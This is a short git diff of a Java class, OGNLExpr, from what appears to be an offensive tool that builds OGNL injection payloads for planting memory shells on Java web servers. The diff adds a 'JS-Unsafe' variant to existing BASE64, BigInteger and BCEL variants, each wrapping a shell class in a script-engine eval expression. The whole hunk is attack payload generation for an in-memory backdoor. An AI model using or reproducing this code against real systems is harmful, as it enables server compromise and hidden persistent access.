@@ -65,6 +65,7 @@ public class OGNLExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
+                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out("(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE)) + "')") + System.lineSeparator() + " <==",
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + "')") + System.lineSeparator() + " <==",
                     "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + "')") + System.lineSeparator() + " <==",
                     "[+] BCEL方案：==>" + out(getBcelMemShell(memShellClass)) + System.lineSeparator() + " <=="
